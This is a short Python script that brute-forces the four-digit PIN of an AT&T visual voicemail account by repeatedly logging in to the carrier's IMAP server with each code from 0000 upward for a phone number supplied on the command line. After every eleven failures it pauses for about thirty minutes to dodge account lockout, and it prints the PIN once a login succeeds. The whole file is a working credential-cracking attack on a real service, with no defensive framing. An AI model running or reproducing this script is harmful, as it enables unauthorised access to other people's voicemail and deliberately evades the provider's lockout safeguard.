import imaplib
import sys
import time

num = sys.argv[1]
index =0

def crack(number,x):
    try:
        imap1 = imaplib.IMAP4("vvm.mobile.att.net",143)
        imap1.login(number,x)
        imap1.close()
        return x
    except Exception as err:
        if "invalid phone number or password" in str(err):
            return 2
        else:
            return 3

for c in range(9999):
    passw = str(c).zfill(4)
    g = crack(num,passw)
    if g== 3:
        print("[!] Ran into an error! Quitting...")
        break
    elif g == 2:
        print("[-] "+str(g))
        index += 1
        if index >= 11:
            print("[*] Sleeping 30 minutes to avoid lock...")
            index =0
            time.sleep(1802)
    else:
        print("[+] "+str(g))
        break

        
